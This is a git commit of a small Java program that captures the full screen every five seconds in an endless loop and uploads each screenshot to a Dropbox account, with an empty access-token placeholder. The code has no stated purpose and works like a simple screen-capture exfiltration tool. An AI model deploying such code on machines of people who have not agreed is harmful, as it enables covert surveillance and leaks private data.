af2ad12e9e754ab89d8bf5a0d79e390a623b5396
SunJoJ <andrzejtawrel1998@gmail.com>
2019-07-09 17:29:44 +0200

    Initial commit

---
+++ src/Main.java
@@ -0,0 +1,19 @@
+import com.dropbox.core.DbxException;
+import com.dropbox.core.DbxRequestConfig;
+import com.dropbox.core.v2.DbxClientV2;
+
+public class Main {
+
+    public static void main(String[] args) {
+
+        String ACCESS_TOKEN = "";
+
+        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
+        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
+
+        MyThread myThread = new MyThread(client);
+        myThread.run();
+
+    }
+
+}
---
+++ src/MyThread.java
@@ -0,0 +1,48 @@
+import com.dropbox.core.v2.DbxClientV2;
+import com.dropbox.core.v2.files.FileMetadata;
+
+import javax.imageio.ImageIO;
+import java.awt.*;
+import java.awt.image.BufferedImage;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.FileInputStream;
+import java.text.DateFormat;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+
+public class MyThread extends Thread {
+
+    private DbxClientV2 client;
+
+    public MyThread(DbxClientV2 client){
+        this.client = client;
+    }
+
+    @Override
+    public void run() {
+        super.run();
+
+        for(;;) {
+
+            try {
+
+                BufferedImage bufferedImage = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
+                DateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmss");
+                Date today = new Date();
+
+                ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                ImageIO.write(bufferedImage, "png", baos);
+                ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
+
+                FileMetadata metadata = client.files().uploadBuilder("/" + dateFormat.format(today)+".png")
+                        .uploadAndFinish(bais);
+                sleep(5000);
+
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+
+        }
+    }
+}
